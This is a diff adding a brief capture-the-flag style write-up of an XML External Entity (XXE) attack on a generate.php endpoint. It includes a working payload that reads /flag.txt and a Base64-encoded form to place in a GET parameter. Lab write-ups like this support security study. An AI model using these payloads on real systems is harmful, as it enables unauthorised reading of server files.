@@ -1,0 +1,14 @@
+XML External Entity (XXE) vulnerability
+
+1. URL & Base64 decode the `input` GET paramater
+2. Inject the external entity into the XML:
+
+```xml
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt" > ]><input><firstName>&xxe;</firstName><lastName>blue</lastName></input>
+```
+
+3. URL & Base64 encode the payload and inject into the `input` GET paramter
+
+```
+/generate.php?input=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgZXh0IFNZU1RFTSAiZmlsZTovLy9mbGFnLnR4dCIgPiBdPjxpbnB1dD48Zmlyc3ROYW1lPiZleHQ7PC9maXJzdE5hbWU%2BPGxhc3ROYW1lPmJsdWU8L2xhc3ROYW1lPjwvaW5wdXQ%2B
+```
